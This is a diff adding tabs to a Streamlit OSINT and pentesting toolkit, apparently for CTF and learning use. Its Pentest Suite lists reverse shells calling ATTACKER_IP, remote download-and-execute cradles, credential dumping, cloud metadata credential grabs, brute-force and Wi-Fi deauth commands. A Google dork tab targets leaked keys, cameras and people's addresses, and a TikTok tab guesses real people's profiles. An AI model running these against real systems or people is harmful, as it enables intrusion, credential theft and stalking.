@@ -308,9 +308,10 @@ with st.sidebar:
     </div>
     """, unsafe_allow_html=True)
 
-tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
+tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8, tab9, tab10, tab11, tab12, tab13, tab14 = st.tabs([
     "🔍 Reverse Image", "👤 Username Hunt", "📧 Email OSINT",
-    "📁 Metadata", "🎯 CTF Solver", "🔬 Deep File Scan", "🌐 Network Recon", "🔑 Password Intel"
+    "📁 Metadata", "🎯 CTF Solver", "🔬 Deep File Scan", "🌐 Network Recon", "🔑 Password Intel",
+    "🎵 TikTok Finder", "🛡️ Pentest Suite", "🔐 Crypto CTF+", "🕵️ Google Dorking", "🌐 Subdomain Recon", "📖 Beginner Guide"
 ])
 
 # ========== TAB 1: Reverse Image ==========
@@ -1294,22 +1295,592 @@ with tab8:
             st.code(wl[:2000])
             st.download_button("📥 Download wordlist.txt", wl, file_name="wordlist.txt", mime="text/plain")
 
-# ========== FOOTER ==========
+# ========== TAB 9: TikTok Direct Finder ==========
+with tab9:
+    st.markdown("### 🎵 TikTok Finder")
+    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Direct TikTok profile search + similar name guessing.</p>", unsafe_allow_html=True)
+    tt_query = st.text_input("TikTok username or real name", placeholder="@charlidamelio or Charlie D'Amelio", key="tt_q")
+    if tt_query:
+        raw = tt_query.strip().lstrip("@").lower()
+        parts = raw.split()
+        candidates = {raw, raw.replace(" ",""), raw.replace(" ","_"), raw.replace(" ",".")}
+        if len(parts) >= 2:
+            f, l = parts[0], parts[-1]
+            candidates.update([f+l, f+"."+l, f+"_"+l, f[0]+l, l+f, f+l+"_official",
+                                f+l+"official", "real"+f+l, f+l+"real", f+l+"tiktok",
+                                f+l+"tt", f+"_"+l+"_", "its"+f+l, f+l+"xo"])
+        candidates = [c for c in candidates if c]
+        st.markdown(f"**Trying {len(candidates)} username variants:**")
+        prog = st.progress(0)
+        found = []
+        for i, u in enumerate(sorted(candidates)):
+            prog.progress((i+1)/len(candidates))
+            url = f"https://tiktok.com/@{u}"
+            try:
+                r = requests.get(url, timeout=5, headers={"User-Agent":"Mozilla/5.0"}, allow_redirects=True)
+                body = r.text.lower()
+                if r.status_code == 200 and not any(x in body for x in ["couldn't find","page not found","user not found","sorry, this"]):
+                    found.append((u, url))
+            except: pass
+        prog.empty()
+        if found:
+            st.success(f"✅ {len(found)} TikTok profile(s) found")
+            for u, url in found:
+                st.markdown(f"<div class='result-card'>🎵 <b>@{u}</b><br><a href='{url}' target='_blank'>{url}</a></div>", unsafe_allow_html=True)
+        else:
+            st.warning("No profiles confirmed live. Try opening links manually:")
+            for u in sorted(candidates)[:8]:
+                st.markdown(f"<div class='result-card'>→ <a href='https://tiktok.com/@{u}' target='_blank'>tiktok.com/@{u}</a></div>", unsafe_allow_html=True)
+        # Always show direct search links
+        st.markdown("#### 🔗 Direct Search Links")
+        c1, c2, c3 = st.columns(3)
+        c1.link_button("TikTok Search", f"https://tiktok.com/search/user?q={urllib.parse.quote(tt_query)}", use_container_width=True)
+        c2.link_button("Google: site:tiktok.com", f"https://google.com/search?q=site:tiktok.com+{urllib.parse.quote(tt_query)}", use_container_width=True)
+        c3.link_button("Tikhub Profile", f"https://tikhub.io/search?keyword={urllib.parse.quote(tt_query)}", use_container_width=True)
+
+# ========== TAB 10: Pentest Suite ==========
+with tab10:
+    st.markdown("### 🛡️ Pentest Suite")
+    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Offensive security reference, payload library, and recon commands. For authorized use only.</p>", unsafe_allow_html=True)
+
+    pt_cat = st.selectbox("Category", [
+        "🔎 Reconnaissance","📡 Port & Service Scanning","💥 Exploitation Reference",
+        "🔑 Credential Attacks","🐚 Reverse Shells","📤 File Transfer","🏃 Post-Exploitation",
+        "🌐 Web App Testing","🔒 SSL/TLS Analysis","📶 Wireless","🐧 Linux PrivEsc","🪟 Windows PrivEsc",
+        "🐳 Docker / Container Escape","☁️ Cloud (AWS/GCP/Azure)","🔄 Pivoting & Tunneling"
+    ], key="pt_cat")
+
+    PT = {
+        "🔎 Reconnaissance": [
+            ("Passive DNS", "dnsx -d target.com -a -aaaa -cname -mx -ns -txt -resp"),
+            ("WHOIS", "whois target.com"),
+            ("Shodan CLI", "shodan host 1.2.3.4\nshodan search 'apache port:80 country:US'"),
+            ("Censys search", "→ censys.io/search  |  API: pip install censys"),
+            ("theHarvester", "theHarvester -d target.com -b google,bing,linkedin,twitter"),
+            ("Recon-ng", "recon-ng\n> marketplace install all\n> workspaces create target\n> db insert domains target.com"),
+            ("Maltego", "GUI — maltego.com (free community edition)"),
+            ("OSINT Framework", "→ osintframework.com"),
+        ],
+        "📡 Port & Service Scanning": [
+            ("Quick top 1000", "nmap -sV -sC -T4 target.com"),
+            ("Full port scan", "nmap -p- --min-rate 5000 -T4 target.com"),
+            ("UDP scan", "nmap -sU --top-ports 200 target.com"),
+            ("Version + scripts", "nmap -sV -sC -p 22,80,443,3306 target.com"),
+            ("Output all formats", "nmap -oA scan_results target.com"),
+            ("Masscan (fast)", "masscan -p1-65535 --rate=10000 target.com"),
+            ("Service banner grab", "nc -nv target.com 80\ntelnet target.com 25"),
+        ],
+        "💥 Exploitation Reference": [
+            ("Search Metasploit", "msfconsole\n> search type:exploit name:apache\n> use exploit/multi/handler"),
+            ("CVE lookup", "→ nvd.nist.gov  |  cve.mitre.org  |  exploit-db.com"),
+            ("SearchSploit", "searchsploit apache 2.4\nsearchsploit -m 12345"),
+            ("Nuclei templates", "nuclei -u https://target.com -t cves/ -t exposures/"),
+            ("SQLmap", "sqlmap -u 'https://target.com/page?id=1' --dbs --batch"),
+            ("WPScan", "wpscan --url https://target.com --enumerate u,p,t"),
+        ],
+        "🔑 Credential Attacks": [
+            ("Hydra SSH", "hydra -l admin -P rockyou.txt ssh://target.com"),
+            ("Hydra HTTP form", "hydra -l admin -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"),
+            ("Medusa FTP", "medusa -h target.com -u admin -P wordlist.txt -M ftp"),
+            ("CrackMapExec SMB", "crackmapexec smb target.com -u users.txt -p passwords.txt"),
+            ("Kerbrute (AD)", "kerbrute userenum -d domain.local users.txt"),
+            ("Default creds DB", "→ default-password.info  |  cirt.net/passwords"),
+        ],
+        "🐚 Reverse Shells": [
+            ("Bash", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
+            ("Python3", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"),
+            ("PHP", "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
+            ("PowerShell", "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"),
+            ("Netcat listener", "nc -lvnp 4444"),
+            ("Upgrade TTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  then  Ctrl+Z  stty raw -echo; fg"),
+            ("RevShells generator", "→ revshells.com"),
+        ],
+        "📤 File Transfer": [
+            ("Python HTTP server", "python3 -m http.server 8080"),
+            ("wget", "wget http://ATTACKER:8080/file.sh -O /tmp/file.sh"),
+            ("curl", "curl http://ATTACKER:8080/file.sh -o /tmp/file.sh"),
+            ("certutil (Windows)", "certutil -urlcache -split -f http://ATTACKER/nc.exe nc.exe"),
+            ("PowerShell download", "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"),
+            ("SCP", "scp file.txt user@target:/tmp/"),
+            ("SMB server (impacket)", "impacket-smbserver share . -smb2support"),
+        ],
+        "🏃 Post-Exploitation": [
+            ("Enumerate users", "cat /etc/passwd  |  id  |  whoami  |  w"),
+            ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
+            ("Writable dirs", "find / -writable -type d 2>/dev/null"),
+            ("Cron jobs", "cat /etc/crontab  |  crontab -l  |  ls /etc/cron.*"),
+            ("LinPEAS", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
+            ("WinPEAS", "iex(iwr https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1 -UseBasicParsing)"),
+            ("Mimikatz (Windows)", ".\\mimikatz.exe\nsekurlsa::logonpasswords\nlsadump::sam"),
+            ("BloodHound (AD)", "SharpHound.exe --CollectionMethods All\n# Import to BloodHound GUI"),
+        ],
+        "🌐 Web App Testing": [
+            ("Directory brute-force", "gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt"),
+            ("ffuf fuzzing", "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302"),
+            ("Nikto scan", "nikto -h https://target.com"),
+            ("Burp Suite", "Intercept proxy → Repeater → Intruder → Scanner (Pro)"),
+            ("CORS test", "curl -H 'Origin: https://evil.com' -I https://target.com/api"),
+            ("JWT decode", "→ jwt.io  |  python3 -c \"import base64,json; print(json.loads(base64.b64decode(token.split('.')[1]+'==')))\""),
+            ("SSRF probe", "Burp Collaborator or webhook.site as callback URL"),
+            ("GraphQL recon", "ffuf -u https://target.com/FUZZ -w graphql-wordlist.txt"),
+        ],
+        "🔒 SSL/TLS Analysis": [
+            ("testssl.sh", "testssl.sh https://target.com"),
+            ("sslscan", "sslscan target.com:443"),
+            ("nmap ssl scripts", "nmap --script ssl-enum-ciphers -p 443 target.com"),
+            ("Certificate transparency", "→ crt.sh/?q=%.target.com  (finds subdomains via SSL certs)"),
+            ("SSL Labs", "→ ssllabs.com/ssltest/analyze.html?d=target.com"),
+        ],
+        "📶 Wireless": [
+            ("Monitor mode", "airmon-ng start wlan0"),
+            ("Capture handshake", "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon"),
+            ("Deauth attack", "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"),
+            ("Crack WPA2", "hashcat -m 2500 cap.hccapx rockyou.txt"),
+            ("WPS attack", "wash -i wlan0mon  →  reaver -i wlan0mon -b BSSID -vv"),
+        ],
+        "🐧 Linux PrivEsc": [
+            ("Sudo -l", "sudo -l  # look for NOPASSWD entries"),
+            ("GTFOBins", "→ gtfobins.github.io  # escape restricted shells via sudo"),
+            ("Kernel exploit", "uname -a  →  search on exploit-db.com"),
+            ("SUID shell", "find / -perm -u=s 2>/dev/null  →  run via GTFOBins"),
+            ("Path hijack", "echo $PATH  →  write malicious binary in writable path dir"),
+            ("Capabilities", "getcap -r / 2>/dev/null"),
+            ("NFS no_root_squash", "cat /etc/exports  →  mount and create SUID binary"),
+        ],
+        "🪟 Windows PrivEsc": [
+            ("Whoami privs", "whoami /priv  # look for SeImpersonatePrivilege"),
+            ("Potato attacks", "PrintSpoofer / JuicyPotato / GodPotato if SeImpersonate"),
+            ("Unquoted service path", "wmic service get name,pathname | findstr /i /v \"c:\\windows\""),
+            ("AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"),
+            ("WinPEAS full", "winpeas.exe > out.txt 2>&1"),
+            ("LOLBAS", "→ lolbas-project.github.io"),
+        ],
+        "🐳 Docker / Container Escape": [
+            ("Check if in container", "cat /proc/1/cgroup | grep docker  |  ls /.dockerenv"),
+            ("Docker socket escape", "find / -name docker.sock 2>/dev/null\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"),
+            ("Privileged container", "fdisk -l  →  mount /dev/sda1 /mnt  →  chroot /mnt"),
+            ("Cap audit_write", "capsh --print | grep cap_sys_admin"),
+            ("Deepce tool", "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh"),
+        ],
+        "☁️ Cloud (AWS/GCP/Azure)": [
+            ("AWS metadata SSRF", "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+            ("AWS CLI enum", "aws sts get-caller-identity\naws s3 ls\naws iam list-users"),
+            ("Enumerate S3", "aws s3 ls s3://bucket-name --no-sign-request"),
+            ("GCP metadata", "curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'"),
+            ("Azure IMDS", "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"),
+            ("Pacu (AWS exploitation)", "pip install pacu  →  pacu"),
+            ("ScoutSuite", "scout aws  # multi-cloud security auditing"),
+        ],
+        "🔄 Pivoting & Tunneling": [
+            ("SSH local forward", "ssh -L 8080:internal.host:80 user@jump.host"),
+            ("SSH dynamic (SOCKS)", "ssh -D 1080 user@jump.host  →  proxychains nmap ..."),
+            ("Chisel", "# Server: chisel server -p 8000 --reverse\n# Client: chisel client ATTACKER:8000 R:3306:127.0.0.1:3306"),
+            ("Ligolo-ng", "# Fastest modern pivot tool — github.com/nicocha30/ligolo-ng"),
+            ("Proxychains", "proxychains nmap -sT -p 80,443 10.10.10.5"),
+            ("Socat port forward", "socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80"),
+        ],
+    }
+    for label, cmd in PT.get(pt_cat, []):
+        st.markdown(f"""<div class='result-card'><b style='color:rgba(200,220,255,0.85);'>{label}</b><br>
+        <code style='font-size:0.78rem;word-break:break-all;white-space:pre-wrap;'>{cmd}</code></div>""", unsafe_allow_html=True)
+
+    st.markdown("**External resources →**")
+    ec = st.columns(4)
+    ec[0].link_button("GTFOBins", "https://gtfobins.github.io", use_container_width=True)
+    ec[1].link_button("LOLBAS", "https://lolbas-project.github.io", use_container_width=True)
+    ec[2].link_button("RevShells", "https://revshells.com", use_container_width=True)
+    ec[3].link_button("HackTricks", "https://book.hacktricks.xyz", use_container_width=True)
+
+# ========== TAB 11: Crypto CTF+ ==========
+with tab11:
+    st.markdown("### 🔐 Crypto CTF+")
+    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Advanced crypto solvers — RSA, XOR, frequency analysis, substitution, and more.</p>", unsafe_allow_html=True)
+    cc = st.selectbox("Tool", ["🔑 RSA Helper","📊 Frequency Analysis","🔀 XOR Brute-Force",
+                                "🔢 Multi-Base Decoder","🔤 Substitution Cipher Hints",
+                                "📜 Classic Cipher Library","🌐 Online Crypto Resources"], key="cc_tool")
+
+    if cc == "🔑 RSA Helper":
+        st.markdown("Paste RSA values to compute missing components or decrypt.")
+        rc1, rc2 = st.columns(2)
+        n_in = rc1.text_input("n (modulus)", key="rsa_n")
+        e_in = rc2.text_input("e (public exp)", value="65537", key="rsa_e")
+        p_in = rc1.text_input("p (factor, optional)", key="rsa_p")
+        q_in = rc2.text_input("q (factor, optional)", key="rsa_q")
+        c_in = st.text_input("c (ciphertext integer, optional)", key="rsa_c")
+        if st.button("Compute", use_container_width=True) and n_in and e_in:
+            try:
+                n, e = int(n_in), int(e_in)
+                p = int(p_in) if p_in else None
+                q = int(q_in) if q_in else None
+                if p and not q: q = n // p
+                if q and not p: p = n // q
+                if p and q:
+                    phi = (p-1)*(q-1)
+                    d = pow(e, -1, phi)
+                    st.markdown(f"<div class='glass-card'><b>d (private exp):</b> <code>{d}</code><br><b>φ(n):</b> <code>{phi}</code></div>", unsafe_allow_html=True)
+                    if c_in:
+                        c = int(c_in)
+                        m = pow(c, d, n)
+                        try:
+                            plain = m.to_bytes((m.bit_length()+7)//8, 'big').decode('utf-8','replace')
+                        except:
+                            plain = str(m)
+                        st.success(f"Decrypted: `{plain}`")
+                else:
+                    st.info("Provide p and q to compute d and decrypt. Use factordb.com to factor n.")
+                    st.link_button("FactorDB →", f"http://factordb.com/index.php?query={n_in}", use_container_width=False)
+            except Exception as ex:
+                st.error(f"Error: {ex}")
+
+    elif cc == "📊 Frequency Analysis":
+        ft = st.text_area("Ciphertext (substitution cipher)", height=120)
+        if ft:
+            freq = Counter(c.upper() for c in ft if c.isalpha())
+            total = sum(freq.values())
+            st.markdown("**Letter frequency (most → least):**")
+            for ch, cnt in freq.most_common():
+                pct = cnt/total*100
+                bar = int(pct*2)
+                st.markdown(f"<div class='result-card'><code>{ch}</code> {'█'*bar} {pct:.1f}%</div>", unsafe_allow_html=True)
+            st.markdown("**English reference:** E T A O I N S H R D L C U M W F G Y P B V K J X Q Z")
+            st.info("Map most-frequent cipher letters to E, T, A, O, I… to guess the substitution key.")
+
+    elif cc == "🔀 XOR Brute-Force":
+        xor_in = st.text_input("Hex-encoded ciphertext", placeholder="1a2b3c4d5e...")
+        if xor_in and xor_in.strip():
+            try:
+                ct = bytes.fromhex(xor_in.replace(" ",""))
+                st.markdown("**Single-byte XOR results (printable only):**")
+                for k in range(256):
+                    res = bytes([b^k for b in ct])
+                    if all(32 <= b <= 126 for b in res):
+                        st.markdown(f"<div class='result-card'><code>key=0x{k:02x}</code> {res.decode()[:200]}</div>", unsafe_allow_html=True)
+            except Exception as ex:
+                st.error(f"Invalid hex: {ex}")
+
+    elif cc == "🔢 Multi-Base Decoder":
+        mb_in = st.text_input("Value", placeholder="VGhpcyBpcyBhIHRlc3Q=")
+        for name, fn in [
+            ("Base16", lambda x: bytes.fromhex(x).decode()),
+            ("Base32", lambda x: base64.b32decode(x.upper() + '='*((8-len(x)%8)%8)).decode()),
+            ("Base58", None),
+            ("Base64", lambda x: base64.b64decode(x+'==').decode()),
+            ("Base85", lambda x: base64.b85decode(x).decode()),
+        ]:
+            if mb_in and fn:
+                try:
+                    st.markdown(f"<div class='result-card'><code>{name}</code> {fn(mb_in.strip())}</div>", unsafe_allow_html=True)
+                except: pass
+        if mb_in:
+            st.link_button("CyberChef (all bases)", f"https://gchq.github.io/CyberChef/#input={urllib.parse.quote(base64.b64encode(mb_in.encode()).decode())}", use_container_width=False)
+
+    elif cc == "🔤 Substitution Cipher Hints":
+        st.markdown("Rules of thumb for solving mono-alphabetic substitution:")
+        hints = [
+            ("1-letter words", "Almost always  **A**  or  **I**"),
+            ("2-letter words", "Common: of, to, in, it, is, be, as, at, so, we, he, by, or, on, do, if, me, my, up, an, go, no, us, am"),
+            ("3-letter words", "Common: the, and, for, are, but, not, you, all, can, her, was, one, our, out, day, get, has"),
+            ("Most frequent letter", "Almost always  **E**"),
+            ("Double letters", "Common doubles: ll, ee, ss, oo, tt, ff, rr, nn, pp"),
+            ("Letter before apostrophe", "Usually  **t** (it's, don't) or  **s** (he's)"),
+            ("Word ending -ing", "Reveals  **i**, **n**, **g**"),
+            ("Word ending -tion", "Common suffix — reveals  **t**, **i**, **o**, **n**"),
+        ]
+        for h, v in hints:
+            st.markdown(f"<div class='result-card'><b>{h}</b><br>{v}</div>", unsafe_allow_html=True)
+
+    elif cc == "📜 Classic Cipher Library":
+        ciphers = {
+            "Vigenère": "Polyalphabetic. Key repeats. Crack with Kasiski / Index of Coincidence.",
+            "Playfair": "Digraph cipher using 5×5 key matrix. Look for repeated digraphs.",
+            "Rail Fence": "Write text in zigzag rows, read across. Try rail counts 2–10.",
+            "Columnar Transposition": "Write in rows, read by column order. Anagramming key columns.",
+            "Beaufort": "Similar to Vigenère but reversed — C = K - P (mod 26).",
+            "Bacon's Cipher": "Each letter encoded as 5-bit A/B sequence (AABBA = F etc.).",
+            "Polybius Square": "5×5 grid — each letter = row,col pair. Watch for pairs of digits.",
+            "Four-Square": "2 key squares + 2 standard. Harder Playfair variant.",
+            "ADFGVX": "WWI field cipher. Substitution + columnar transposition with 6-char alphabet.",
+            "One-Time Pad": "Theoretically unbreakable if key is truly random and never reused.",
+        }
+        for name, desc in ciphers.items():
+            st.markdown(f"<div class='result-card'><b>{name}</b><br><span style='color:rgba(160,200,240,0.7);font-size:0.82rem;'>{desc}</span></div>", unsafe_allow_html=True)
+
+    elif cc == "🌐 Online Crypto Resources":
+        links = [
+            ("CyberChef","https://gchq.github.io/CyberChef/","All-in-one encode/decode/crypto tool"),
+            ("dCode.fr","https://dcode.fr/en","Every classic cipher solver ever made"),
+            ("CryptII","https://cryptii.com","Visual cipher conversion pipeline"),
+            ("quipqiup","https://quipqiup.com","Fast substitution cipher solver"),
+            ("FactorDB","http://factordb.com","Factor large RSA moduli"),
+            ("RsaCtfTool","https://github.com/RsaCtfTool/RsaCtfTool","Automated RSA attack tool"),
+            ("CrackStation","https://crackstation.net","Hash cracking rainbow tables"),
+            ("Boxentriq","https://boxentriq.com/code-breaking","Cipher identifier + solver"),
+        ]
+        for name, url, desc in links:
+            st.markdown(f"<div class='result-card'><b><a href='{url}' target='_blank'>{name}</a></b><br><span style='color:rgba(160,200,240,0.6);font-size:0.82rem;'>{desc}</span></div>", unsafe_allow_html=True)
+
+# ========== TAB 12: Google Dorking ==========
+with tab12:
+    st.markdown("### 🕵️ Google Dorking")
+    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Build advanced search operators to find exposed data, files, and services.</p>", unsafe_allow_html=True)
+    d_target = st.text_input("Target domain or keyword", placeholder="example.com", key="dork_target")
+    dork_cat = st.selectbox("Dork category", [
+        "🔓 Login / Admin pages","📁 Exposed files & directories","🗄️ Database & config leaks",
+        "📷 Cameras & IoT","👤 People search","🔑 Credentials & keys",
+        "🌐 Subdomains & infrastructure","📧 Email harvesting","Custom dork builder"
+    ], key="dork_cat")
+
+    DORKS = {
+        "🔓 Login / Admin pages": [
+            'site:{t} inurl:admin', 'site:{t} inurl:login', 'site:{t} inurl:wp-admin',
+            'site:{t} intitle:"admin panel"', 'site:{t} inurl:dashboard',
+            'site:{t} inurl:phpmyadmin', 'site:{t} inurl:cpanel',
+        ],
+        "📁 Exposed files & directories": [
+            'site:{t} intitle:"index of"', 'site:{t} intitle:"index of /" inurl:backup',
+            'site:{t} ext:log', 'site:{t} ext:bak OR ext:old OR ext:backup',
+            'site:{t} ext:sql', 'site:{t} ext:xlsx OR ext:csv', 'site:{t} intitle:"index of" "parent directory"',
+        ],
+        "🗄️ Database & config leaks": [
+            'site:{t} ext:env', 'site:{t} ext:config', 'site:{t} "DB_PASSWORD"',
+            'site:{t} ext:xml inurl:config', 'site:{t} inurl:wp-config.php.bak',
+            'site:{t} ext:json "api_key"', 'site:{t} "mysql_connect"',
+        ],
+        "📷 Cameras & IoT": [
+            'inurl:"/view/index.shtml"', 'intitle:"Live View / - AXIS"',
+            'inurl:top.htm inurl:currenttime', 'intitle:"IP CAMERA Viewer"',
+            'inurl:"/viewer/live/index.html"', 'site:{t} inurl:cgi-bin/viewer',
+        ],
+        "👤 People search": [
+            '"{t}" site:linkedin.com', '"{t}" site:facebook.com',
+            '"{t}" email OR contact', '"{t}" resume OR cv filetype:pdf',
+            '"{t}" site:twitter.com', '"{t}" phone OR address',
+        ],
+        "🔑 Credentials & keys": [
+            'site:{t} "password" ext:txt', 'site:{t} "api_key" OR "apikey"',
+            'site:{t} "BEGIN RSA PRIVATE KEY"', 'site:{t} "access_token"',
+            'site:{t} "secret_key"', '"github.com" "{t}" "password"',
+        ],
+        "🌐 Subdomains & infrastructure": [
+            'site:*.{t}', 'site:{t} -www', 'site:{t} inurl:dev OR staging OR test',
+            'site:{t} inurl:api', 'ip:{t}', 'link:{t}',
+        ],
+        "📧 Email harvesting": [
+            'site:{t} "@{t}"', 'site:{t} "email" OR "contact" ext:txt',
+            '"{t}" "@gmail.com" OR "@yahoo.com"', 'site:{t} inurl:contact',
+        ],
+    }
+
+    if dork_cat == "Custom dork builder":
+        op1 = st.selectbox("Operator 1", ["site:","inurl:","intitle:","filetype:","ext:","intext:","link:","cache:"])
+        val1 = st.text_input("Value 1", value=d_target)
+        op2 = st.selectbox("Operator 2 (optional)", ["","inurl:","intitle:","filetype:","ext:","intext:","-inurl:"])
+        val2 = st.text_input("Value 2")
+        custom = f'{op1}{val1} {op2}{val2}'.strip()
+        st.markdown(f"<div class='result-card'><code>{custom}</code></div>", unsafe_allow_html=True)
+        st.link_button("Search on Google →", f"https://google.com/search?q={urllib.parse.quote(custom)}", use_container_width=True)
+    else:
+        t = d_target or "example.com"
+        dorks = DORKS.get(dork_cat, [])
+        for dork in dorks:
+            query = dork.format(t=t)
+            url = f"https://google.com/search?q={urllib.parse.quote(query)}"
+            st.markdown(f"""<div class='result-card'>
+              <code>{query}</code><br>
+              <a href='{url}' target='_blank' style='font-size:0.75rem;color:rgba(0,200,255,0.7);'>→ Search Google</a>
+            </div>""", unsafe_allow_html=True)
+        ec1, ec2 = st.columns(2)
+        ec1.link_button("Google Advanced Search", "https://google.com/advanced_search", use_container_width=True)
+        ec2.link_button("Exploit-DB GHDB", "https://www.exploit-db.com/google-hacking-database", use_container_width=True)
+
+# ========== TAB 13: Subdomain Recon ==========
+with tab13:
+    st.markdown("### 🌐 Subdomain Recon")
+    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Certificate transparency, DNS brute-force wordlists, and passive recon sources.</p>", unsafe_allow_html=True)
+    sd_domain = st.text_input("Domain", placeholder="example.com", key="sd_dom")
+    if st.button("🔍 Enumerate", use_container_width=True) and sd_domain:
+        d = sd_domain.strip().lower()
+
+        # crt.sh — certificate transparency
+        st.markdown("#### 📜 Certificate Transparency (crt.sh)")
+        with st.spinner("Querying crt.sh..."):
+            try:
+                r = requests.get(f"https://crt.sh/?q=%.{d}&output=json", timeout=10)
+                if r.status_code == 200:
+                    entries = r.json()
+                    subs = sorted({e['name_value'].strip().lower() for e in entries
+                                   if d in e.get('name_value','') and '*' not in e.get('name_value','')})
+                    st.success(f"✅ {len(subs)} unique subdomains via certificate transparency")
+                    for s in subs[:80]:
+                        st.markdown(f"<div class='result-card'><code>{s}</code></div>", unsafe_allow_html=True)
+                    if len(subs) > 80:
+                        st.info(f"Showing 80 of {len(subs)}. Use subfinder/amass for full list.")
+                else:
+                    st.warning("crt.sh returned no data")
+            except Exception as ex:
+                st.error(f"crt.sh error: {ex}")
+
+        # HackerTarget
+        st.markdown("#### 🎯 HackerTarget DNS lookup")
+        try:
+            ht = requests.get(f"https://api.hackertarget.com/hostsearch/?q={d}", timeout=8)
+            if ht.status_code == 200 and "error" not in ht.text.lower():
+                ht_subs = [line.split(",")[0] for line in ht.text.strip().splitlines() if "," in line]
+                for s in ht_subs[:30]:
+                    st.markdown(f"<div class='result-card'><code>{s}</code></div>", unsafe_allow_html=True)
+        except: pass
+
+        # Tool commands
+        with st.expander("⚙️ Local enumeration commands"):
+            st.code(f"""
+subfinder -d {d} -o subs.txt
+amass enum -passive -d {d}
+dnsrecon -d {d} -t brt -D /usr/share/wordlists/dnsmap.txt
+ffuf -u https://FUZZ.{d} -w subdomains-top1million-5000.txt -mc 200,301,302
+dnsx -l subs.txt -a -aaaa -cname -resp
+httpx -l subs.txt -status-code -title -tech-detect
+            """)
+
+        # Passive intel links
+        st.markdown("#### 🔗 Passive OSINT sources")
+        lc = st.columns(4)
+        lc[0].link_button("crt.sh", f"https://crt.sh/?q=%.{d}", use_container_width=True)
+        lc[1].link_button("SecurityTrails", f"https://securitytrails.com/list/apex_domain/{d}", use_container_width=True)
+        lc[2].link_button("VirusTotal", f"https://virustotal.com/gui/domain/{d}/relations", use_container_width=True)
+        lc[3].link_button("Shodan", f"https://shodan.io/search?query=hostname:{d}", use_container_width=True)
+
+# ========== TAB 14: Beginner Guide ==========
+with tab14:
+    st.markdown("### 📖 Beginner's Handbook")
+    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>From zero to confident — roadmaps, resources, and quick references for every level.</p>", unsafe_allow_html=True)
+    guide = st.selectbox("Topic", [
+        "🗺️ Learning Roadmap","🚩 CTF Quickstart","🔐 Linux Basics","🐍 Python for Hacking",
+        "📚 Free Learning Resources","🧰 Essential Toolbox","🔤 Terminology Glossary"
+    ], key="guide_cat")
+
+    if guide == "🗺️ Learning Roadmap":
+        stages = [
+            ("Stage 1 — Foundations (0–3 months)",
+             ["Linux command line (OverTheWire: Bandit)","Python basics (automate.withpython.com)","Networking: TCP/IP, DNS, HTTP","TryHackMe — Pre-Security path (free)"]),
+            ("Stage 2 — Core Skills (3–6 months)",
+             ["TryHackMe — Jr Penetration Tester path","Web vulnerabilities (PortSwigger Web Academy — free)","Cryptography basics (cryptohack.org)","CTF beginner competitions: picoCTF, CTFlearn"]),
+            ("Stage 3 — Hands-On (6–12 months)",
+             ["HackTheBox — Starting Point machines","OSCP preparation (TCM Security / Offensive Security)","Specialize: web / binary / forensics / crypto","CTFtime.org — join team competitions"]),
+            ("Stage 4 — Advanced",
+             ["HackTheBox Pro Labs (Offshore, RastaLabs)","Bug bounty: HackerOne, Bugcrowd","Certifications: OSCP, PNPT, CEH, eJPT","Contribute to open-source tools, write CVEs"]),
+        ]
+        for title, items in stages:
+            with st.expander(title):
+                for item in items:
+                    st.markdown(f"<div class='result-card'>▸ {item}</div>", unsafe_allow_html=True)
+
+    elif guide == "🚩 CTF Quickstart":
+        steps = [
+            ("Step 1: Read the challenge description carefully","Note the category (crypto, web, forensics, misc, pwn, rev). Every word can be a hint."),
+            ("Step 2: Identify the format","Run `file`, `strings`, `xxd` on any given file before anything else."),
+            ("Step 3: Google the obvious","Paste any strange strings, cipher-looking text, or error messages into Google + 'CTF'."),
+            ("Step 4: Check encoding layers","Data is often Base64 → URL-encoded → hex → ROT13. Use this tool's Multi-Decoder."),
+            ("Step 5: Look for the flag format","Most CTFs use flag{...} or ctf{...}. Search strings output for it."),
